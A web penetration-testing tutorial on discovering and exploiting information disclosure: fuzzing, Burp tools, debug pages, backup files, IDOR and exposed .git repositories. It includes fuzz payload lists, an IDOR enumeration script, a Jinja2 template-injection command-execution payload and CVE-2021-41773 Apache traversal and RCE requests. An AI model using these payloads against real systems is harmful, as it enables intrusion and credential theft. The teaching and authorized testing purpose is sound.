# How to find and exploit information disclosure vulnerabilities

Finding information disclosure requires a different mindset than exploiting technical vulnerabilities. Instead of injecting malicious payloads, you're observing what the application voluntarily reveals through errors, comments, configurations, and responses. Success depends on maintaining broad awareness—recognizing sensitive information wherever it appears—and systematically probing every corner of the application for leaks.

This section provides practical techniques, tools, and workflows for discovering and exploiting information disclosure across its many manifestations.

> Only test systems you own or are explicitly authorized to assess.

## Testing methodology (systematic approach)

### Core principle: Avoid tunnel vision

**Common mistake:**
```
Tester focuses only on finding SQLi
→ Misses database credentials in error message
→ Misses version disclosure in headers
→ Misses exposed .git repository
Result: Overlooks easier compromise paths
```

**Better approach:**
```
While testing for SQLi, also observe:
- Error messages (framework version? SQL structure?)
- Response headers (server software? custom headers?)
- HTML comments (developer notes? hidden endpoints?)
- Response timing (information oracle?)
Result: Build comprehensive attack surface understanding
```

### Reconnaissance-driven testing

**Phase 1: Passive observation**
- Browse entire application normally
- View every page source
- Check robots.txt and sitemap.xml
- Examine all HTTP headers
- Note technologies used (frameworks, libraries)
- Read all error messages encountered

**Phase 2: Active probing**
- Force errors with invalid input
- Test for common files (backups, configs)
- Check for version control exposure (.git)
- Enumerate hidden directories
- Test API documentation accessibility
- Probe debug endpoints

**Phase 3: Deep analysis**
- Fuzz parameters with unexpected values
- Compare error message variations
- Measure response timing differences
- Decode tokens (JWT, session cookies)
- Extract and analyze JavaScript
- Search for comments everywhere

## Fuzzing for information disclosure

### What to fuzz

**Parameter value fuzzing:**
```
Original: /user?id=123

Fuzz with:
- Type confusion: id=abc, id=true, id=null
- Boundary values: id=0, id=-1, id=999999999
- Special characters: id=', id=", id=<script>
- Path traversal: id=../../etc/passwd
- SQL injection: id=1' OR '1'='1
- Format strings: id=%s%s%s%s
```

**Purpose:** Trigger different error conditions that reveal information.

### Fuzzing with Burp Intruder

**Setup:**

1. **Identify interesting parameter:**
```http
GET /product?id=123 HTTP/1.1
Host: target.com
```

2. **Send to Intruder, mark position:**
```http
GET /product?id=§123§ HTTP/1.1
```

3. **Select payload type:** "Fuzzing - full" or custom list:
```
0
-1
999999999
null
undefined
'
"
<script>
../../../etc/passwd
1' OR '1'='1
%s%s%s%s
${7*7}
{{7*7}}
```

4. **Configure Grep - Match:**
```
Keywords to highlight:
- error
- exception
- warning
- stack trace
- SQL
- SELECT
- database
- mysql
- postgresql
- root@
- admin
- password
- secret
- key
```

5. **Configure Grep - Extract:**
```
Extract error messages:
<error>(.*?)</error>
Error: (.*)
Exception: (.*)
```

6. **Start attack and analyze:**
- Sort by response length (unusual lengths indicate different behavior)
- Sort by status code (500 errors often verbose)
- Check grep matches for keywords
- Compare extracted error messages

### Example: Fuzzing reveals framework

**Normal request:**
```http
GET /product?id=123 HTTP/1.1

Response: 200 OK
Content: Product details...
```

**Fuzzed request:**
```http
GET /product?id=abc HTTP/1.1

Response: 500 Internal Server Error

<h1>Django Debug Page</h1>
<div class="exception">
ValueError at /product
invalid literal for int() with base 10: 'abc'

File "/var/www/app/views.py", line 42, in product_detail
    product_id = int(request.GET['id'])

Python 3.8.5
Django 3.1.2
</div>
```

**Information gained:**
- Framework: Django 3.1.2
- Python version: 3.8.5
- File path: /var/www/app/views.py
- Code snippet reveals parameter handling
- Can search for Django 3.1.2 CVEs

## Using Burp Suite tools

### Burp Scanner (Professional)

**Automated detection:**
- Scans for backup files (.bak, .old, ~)
- Identifies exposed source control (.git, .svn)
- Detects verbose error messages
- Finds sensitive data in responses (credit cards, SSNs, API keys)
- Identifies version disclosure
- Discovers directory listings

**How to use:**
```
1. Right-click target in site map
2. Select "Scan" → "Audit selected items"
3. Configure scan settings
4. Review identified information disclosure issues
```

### Burp Search tool

**Find sensitive keywords:**

1. **Right-click any request** → Engagement tools → Search
2. **Enter search term:**
   - `password`
   - `api_key`
   - `secret`
   - `token`
   - `admin`
   - `debug`
   - `TODO`
   - `FIXME`

3. **Configure options:**
   - Case sensitive: No
   - Regex: Yes (for complex patterns)
   - Negative search: Yes (find absences)

**Example regex patterns:**
```
API keys:
[Aa][Pp][Ii]_?[Kk][Ee][Yy]\s*[:=]\s*['"]?([A-Za-z0-9_-]+)['"]?

AWS keys:
AKIA[0-9A-Z]{16}

Private keys:
-----BEGIN.*PRIVATE KEY-----

Email addresses:
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}

IP addresses:
\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b
```

### Find Comments tool

**Extract developer comments:**

1. **Right-click target** → Engagement tools → Find comments
2. **Review all comments** in dedicated window
3. **Look for:**
   - TODOs indicating incomplete security
   - Credentials in comments
   - Hidden URLs/endpoints
   - Debug information
   - Security bypass instructions

**Example findings:**
```html
<!-- TODO: Remove this before production -->
<!-- Admin panel: /secret-admin-v2 -->
<!-- Default password: admin123 -->
<!-- API key: sk_live_4eC39HqLyjWDarjtT1zdp7dc -->
<!-- Note to self: Remove authentication check on /api/internal -->
```

### Discover Content tool

**Find hidden directories/files:**

1. **Right-click site** → Engagement tools → Discover content
2. **Configure:**
   - Use preset wordlist or custom
   - Set file extensions to check (.php, .bak, .old, etc.)
   - Configure response analysis

3. **Common finds:**
```
/admin/
/backup/
/config/
/dev/
/test/
/api-docs/
/debug/
/.git/
/phpinfo.php
```

### Logger++ extension

**Advanced response logging and filtering:**

1. **Install from BApp Store**
2. **Configure filters:**
```
Filter: Response contains "error"
Filter: Response contains "password"
Filter: Status code == 500
Filter: Response length > 10000 (unusually large)
```

3. **Export findings** for analysis

## Engineering informative responses

### Technique: Force type errors

**Goal:** Make application reveal data types in error messages.

**Example - Parameter type confusion:**
```http
# Normal
GET /user/profile?id=123 HTTP/1.1
Response: User profile for ID 123

# Force error
GET /user/profile?id=abc HTTP/1.1
Response: Error: Expected integer, got string "abc"

GET /user/profile?id=9999999999999999999999 HTTP/1.1
Response: Error: Integer overflow for user ID
```

**Information gained:** Parameter expects integer, database likely uses integer type.

### Technique: Invalid references

**Force application to reveal valid references:**

```http
# Test invalid product ID
GET /product?id=99999 HTTP/1.1

Response: 
Error: Product with ID 99999 not found
Valid product IDs range from 1 to 5000
```

**Information gained:** Valid ID range, can enumerate products 1-5000.

### Technique: Stack trace manipulation

**Trigger deeper stack traces:**

```http
# Simple error
GET /api/user?id=abc HTTP/1.1
Response: Invalid parameter

# Nested error (pass validation, fail deeper)
GET /api/user?id=123&action=invalid HTTP/1.1
Response:
Traceback:
  File "/app/api.py", line 50, in get_user
    user = database.query("SELECT * FROM users WHERE id=%s", id)
  File "/app/database.py", line 25, in query
    cursor.execute(query, params)
  File "/usr/lib/python3.8/mysql/connector.py", line 890

Database: MySQL 5.7.31
Connection: mysql://dbuser:P@ssw0rd@db.internal.company.com:3306/production
```

**Information gained:** Complete database connection string including credentials!

### Technique: Differential analysis

**Compare responses to infer information:**

```http
# Test 1: Valid user
GET /user/profile?username=admin HTTP/1.1
Response: 401 Unauthorized - Incorrect password

# Test 2: Invalid user  
GET /user/profile?username=doesnotexist HTTP/1.1
Response: 404 Not Found - User not found
```

**Inference:** Different status codes enable username enumeration.

## Common sources (detailed exploitation)

### Source 1: robots.txt and sitemap.xml

**Reconnaissance:**
```bash
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
```

**Example robots.txt:**
```
User-agent: *
Disallow: /admin/
Disallow: /api/internal/
Disallow: /backup/
Disallow: /config/
Disallow: /old-site/
Disallow: /.git/
Disallow: /user/private/
```

**Exploitation:**
```bash
# Test each disallowed path
curl https://target.com/admin/
curl https://target.com/api/internal/
curl https://target.com/backup/
curl https://target.com/.git/HEAD
```

**Result:** Discover admin panels, internal APIs, backups, source control.

### Source 2: Directory listings

**Identification:**
```http
GET /images/ HTTP/1.1

Response:
<html>
<head><title>Index of /images/</title></head>
<body>
<h1>Index of /images/</h1>
<ul>
  <li><a href="logo.png">logo.png</a> - 45KB</li>
  <li><a href="backup/">backup/</a></li>
  <li><a href="config.php.bak">config.php.bak</a> - 2KB</li>
</ul>
</body>
```

**Exploitation:**
```bash
# Download exposed backup
curl https://target.com/images/config.php.bak

# Contents:
<?php
$db_host = "localhost";
$db_user = "webapp";
$db_pass = "SecretPassword123!";
$api_key = "sk_live_4eC39HqLyjWDarjtT1zdp7dc";
?>
```

**Automated enumeration:**
```bash
# Find all directory listings
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,bak,old
```

### Source 3: Developer comments

**Manual review:**
```bash
# View page source in browser: Ctrl+U
# Search for: <!-- (comment markers)
```

**Automated extraction:**
```bash
# Using grep
curl -s https://target.com | grep -o '<!--.*-->'

# Using Burp's Find Comments tool (see above)
```

**Example findings:**
```html
<html>
<head>
    <!-- Production DB: 10.0.1.50:3306 -->
    <!-- Staging DB: 10.0.1.51:3306 -->
</head>
<body>
    <!-- TODO: Implement proper auth before launch -->
    <!-- Current bypass: Add header X-Debug-Mode: true -->
    
    <form action="/login">
        <!-- Remember: admin / TempPass2024! for testing -->
        <input name="username">
        <input name="password">
    </form>
    
    <!-- FIXME: SQL injection in search - need to sanitize -->
    <input name="search">
</body>
</html>
```

**JavaScript comments:**
```javascript
// config.js
const API_URL = "https://api.internal.company.com/v1";
const API_KEY = "AIzaSyDXxXxXxXxXxXxXx"; // Google Maps API
// const OLD_API = "https://old-api.company.com"; // Deprecated, still works

// auth.js  
function validateLogin(user, pass) {
    // TODO: Fix admin bypass
    if (user === "admin" && pass.includes("2024")) {
        return true; // Any password with 2024 works!
    }
    return checkDatabase(user, pass);
}
```

### Source 4: Error messages (verbose)

**Lab scenario - Information disclosure in error messages:**

**Test 1: SQL error exposure**
```http
GET /product?id=1' HTTP/1.1

Response: 500 Internal Server Error

MySQL Error: You have an error in your SQL syntax near 
'SELECT * FROM products WHERE id = '1'' at line 1

Database: production_db
User: webapp@localhost
Version: MySQL 5.7.31-log
```

**Exploitation:**
- Confirms SQL injection vulnerability
- Reveals database type and version
- Shows table structure hint
- Enables targeted SQL injection

**Test 2: Framework version in error**
```http
GET /api/invalid HTTP/1.1

Response: 500 Internal Server Error

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Laravel - Error 500</title>
</head>
<body>
    <div class="exception">
        <h2>NotFoundHttpException</h2>
        <p>Route [api/invalid] not defined</p>
        
        <div class="trace">
            vendor/laravel/framework/src/Illuminate/Routing/Router.php:883
        </div>
        
        <div class="info">
            Laravel Framework 8.0.0
            PHP 7.4.3
            Environment: production (!!)
        </div>
    </div>
</body>
</html>
```

**Exploitation:**
```bash
# Search for Laravel 8.0.0 vulnerabilities
searchsploit laravel 8.0.0

# Found: CVE-2021-3129 - RCE via debug mode
# Exploit available: https://github.com/nth347/CVE-2021-3129_exploit
```

### Source 5: Debug pages

**Lab scenario - Information disclosure on debug page:**

**Discovery:**
```bash
# Common debug endpoints
curl https://target.com/debug
curl https://target.com/debug.php
curl https://target.com/phpinfo.php
curl https://target.com/info.php
curl https://target.com/test.php
curl https://target.com/trace
curl https://target.com/_profiler/
```

**Example /debug page:**
```html
<h1>Application Debug Information</h1>

<h2>Environment Variables</h2>
<pre>
DB_HOST=db.internal.company.com
DB_USER=webapp_admin
DB_PASSWORD=xK9$mP2!vL5qN8@rT3
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_live_4eC39HqLyjWDarjtT1zdp7dc
JWT_SECRET=my_super_secret_jwt_key_12345
</pre>

<h2>Active Database Connections</h2>
<ul>
    <li>Connection 1: webapp_admin@db.internal.company.com</li>
    <li>Connection 2: root@localhost</li>
</ul>

<h2>Session Data</h2>
<pre>
user_id: 42
username: admin
role: administrator
is_authenticated: true
csrf_token: abc123def456
</pre>

<h2>Application Configuration</h2>
<pre>
APP_ENV=production
APP_DEBUG=true
APP_KEY=base64:VerySecretKey123==
LOG_CHANNEL=stack
</pre>
```

**Exploitation:**
- Use DB credentials to access database directly
- Use AWS keys to access cloud infrastructure
- Use Stripe key to process fraudulent transactions
- Forge JWT with known secret
- Session hijacking via known user_id

### Source 6: User account pages (IDOR)

**Lab scenario - Information disclosure via IDOR:**

**Intended behavior:**
```http
# Logged in as user 456
GET /user/account?user=456 HTTP/1.1
Cookie: session=user456_token

Response: Your email: user456@example.com
```

**Test IDOR:**
```http
# Change user parameter
GET /user/account?user=1 HTTP/1.1
Cookie: session=user456_token

Response: Your email: admin@company.com
API Key: sk_live_xxxxxxxxxxx
```

**Enumeration:**
```python
import requests

session = "user456_token"

for user_id in range(1, 1000):
    r = requests.get(
        f"https://target.com/user/account?user={user_id}",
        cookies={"session": session}
    )
    
    if "email" in r.text:
        email = extract_email(r.text)
        print(f"User {user_id}: {email}")
        
        if "API Key" in r.text:
            api_key = extract_api_key(r.text)
            print(f"  API Key: {api_key}")
```

**Result:** Enumerate all users, extract emails, API keys, personal data.

### Source 7: Backup files

**Lab scenario - Source code disclosure via backup files:**

**Common backup patterns:**
```
Original file:     config.php
Backup patterns:   config.php.bak
                   config.php.old
                   config.php~
                   config.php.backup
                   config.php.save
                   config.php.swp
                   config.php.swo
                   .config.php.swp
                   #config.php#
                   config.php.2024-01-15
```

**Automated testing:**
```bash
# Using ffuf
ffuf -u https://target.com/FUZZ -w backup-files.txt -mc 200

# Wordlist: backup-files.txt
config.php.bak
config.php.old
index.php.bak
database.php.old
api.php~
```

**Exploitation example:**
```bash
curl https://target.com/config.php
# Response: Blank page (PHP executed, no output)

curl https://target.com/config.php.bak
# Response: Source code (not executed!)

<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');
define('DB_PASS', 'RootPassword123!');
define('DB_NAME', 'production_db');

$stripe_secret = 'sk_live_4eC39HqLyjWDarjtT1zdp7dc';
$jwt_secret = 'my_jwt_secret_key_12345';

// Admin bypass for testing
if ($_GET['debug'] == 'true' && $_SERVER['REMOTE_ADDR'] == '127.0.0.1') {
    $_SESSION['admin'] = true;
}
?>
```

**Information gained:**
- Database credentials
- API keys
- JWT secret (can forge tokens)
- Admin bypass logic (can exploit if X-Forwarded-For trusted)

### Source 8: Insecure configuration

**Lab scenario - Authentication bypass via information disclosure:**

**Test TRACE method:**
```http
TRACE / HTTP/1.1
Host: target.com
Authorization: Bearer secret_token_123
X-Custom-Auth: admin_user
Cookie: session=abc123
```

**Response:**
```http
HTTP/1.1 200 OK

TRACE / HTTP/1.1
Host: target.com
Authorization: Bearer secret_token_123
X-Custom-Auth: admin_user
X-Internal-Auth-User: administrator
X-Internal-User-ID: 1
Cookie: session=abc123
```

**Information gained:**
- Server adds internal auth headers
- `X-Internal-Auth-User: administrator`
- Can try adding this header to bypass auth

**Exploitation:**
```http
GET /admin HTTP/1.1
Host: target.com
X-Internal-Auth-User: administrator

Response: 200 OK (admin access granted!)
```

**Other config issues:**
```bash
# Server status pages
curl https://target.com/server-status
curl https://target.com/server-info

# Exposed metrics
curl https://target.com/metrics
curl https://target.com/actuator/env
curl https://target.com/actuator/health
```

### Source 9: Version control history (.git exposure)

**Lab scenario - Version control history exposure:**

**Detection:**
```bash
curl https://target.com/.git/HEAD
# Response: ref: refs/heads/master
# .git directory exists!
```

**Manual enumeration:**
```bash
curl https://target.com/.git/config
curl https://target.com/.git/logs/HEAD
curl https://target.com/.git/refs/heads/master
```

**Automated extraction:**
```bash
# Using git-dumper
git-dumper https://target.com/.git ./extracted-repo

# Or using GitHack
GitHack.py https://target.com/.git

# Or using wget
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://target.com/.git/
```

**Post-extraction analysis:**
```bash
cd extracted-repo

# View commit history
git log --all --oneline

# Example output:
# a1b2c3d Fix security issue in login
# e4f5g6h Remove hardcoded passwords
# i7j8k9l Add database config
# m0n1o2p Initial commit

# View specific commit
git show e4f5g6h

# Shows DIFF:
-$db_password = "ProductionPass123!";
+$db_password = getenv('DB_PASSWORD');

# Password visible in deleted line!
```

**Search for secrets in history:**
```bash
# Search all commits for secrets
git log -p | grep -i "password"
git log -p | grep -i "api.key"
git log -p | grep -i "secret"

# Check for sensitive files ever committed
git log --all --full-history -- "*.env"
git log --all --full-history -- "*config.php"
git log --all --full-history -- "*secret*"
```

**Real-world example:**
```bash
git log -p

commit a1b2c3d4...
Author: dev@company.com
Date: Mon Jan 15 10:30:00 2024

    Remove hardcoded AWS credentials

diff --git a/deploy.sh b/deploy.sh
-AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
-AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCY"
+AWS_ACCESS_KEY_ID=$(aws_vault export)
+AWS_SECRET_ACCESS_KEY=$(aws_vault export)
```

**Exploitation:** Use exposed AWS credentials to access cloud infrastructure.

## Practical exploitation workflows

### Workflow 1: Error message to RCE

**Step 1: Trigger verbose error**
```http
GET /api/process?file=test.txt HTTP/1.1

Response: 500 Error
FileNotFoundError: [Errno 2] No such file: '/var/www/uploads/test.txt'
Template engine: Jinja2 2.10.1
Python: 3.7.3
```

**Step 2: Test for template injection**
```http
GET /api/process?file={{7*7}} HTTP/1.1

Response: 
FileNotFoundError: [Errno 2] No such file: '/var/www/uploads/49'
                                                                ^^
# 7*7 = 49, expression evaluated!
```

**Step 3: Escalate to RCE**
```http
GET /api/process?file={{''.__class__.__mro__[1].__subclasses__()[414]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0]}} HTTP/1.1

Response:
FileNotFoundError: [Errno 2] No such file: '/var/www/uploads/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...'
```

### Workflow 2: Comment disclosure to admin access

**Step 1: Find comments**
```html
<!-- Admin panel moved to /admin-v2-secure -->
<!-- Default login: admin / changeme -->
```

**Step 2: Access admin panel**
```http
GET /admin-v2-secure HTTP/1.1

Response: Login page
```

**Step 3: Use default credentials**
```http
POST /admin-v2-secure/login HTTP/1.1

username=admin&password=changeme

Response: 302 Redirect to /admin-v2-secure/dashboard
```

### Workflow 3: Version disclosure to exploit

**Step 1: Identify version**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
```

**Step 2: Search for exploits**
```bash
searchsploit apache 2.4.49

# Found: CVE-2021-41773 - Path Traversal & RCE
```

**Step 3: Apply public exploit**
```http
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1

Response: root:x:0:0:root:/root:/bin/bash
```

**Step 4: Escalate to RCE**
```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
Content-Type: application/x-www-form-urlencoded

echo; whoami

Response: daemon
```
